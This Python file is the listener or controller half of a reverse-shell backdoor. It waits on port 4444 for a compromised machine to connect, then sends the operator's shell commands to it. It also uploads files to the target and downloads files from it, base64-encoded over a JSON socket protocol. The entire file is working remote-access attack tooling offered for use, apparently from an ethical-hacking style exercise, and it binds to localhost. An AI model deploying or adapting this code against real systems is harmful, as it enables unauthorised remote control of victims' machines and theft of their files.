#!/usr/bin/python

import socket
import json
import base64
import os
import sys
import shutil
import colorama
from colorama import Fore, Style

colorama.init()

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind(("127.0.0.1", 4444))
        self.listener.listen(0)
        print(Fore.GREEN + "[+] Waiting for Incoming Connection" + Style.RESET_ALL)
        self.connection, address = self.listener.accept()
        print(Fore.GREEN + "[+] Got a Connection from " + str(address) + Style.RESET_ALL)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode('utf-8')

    def show_help(self):
        help_text = """
        Available Commands:
        - cd <path>        : Change working directory to <path>
        - upload <path> <file_content> : Upload file to <path>
        - download <path> : Download file from <path>
        - exit             : Exit the listener
        - !help            : Show this help message
        """
        return help_text

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "!help":
                    result = self.show_help()
                elif command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                    result = self.execute_remotely(command)
                else:
                    result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

            except Exception as e:
                result = f"[-] Error during command execution: {str(e)}"
                
            print(Fore.GREEN + result + Style.RESET_ALL)

try:
    my_listener = Listener("127.0.0.1", 4444)
    my_listener.run()
except Exception as e:
    sys.exit(f"[-] Exception: {str(e)}")

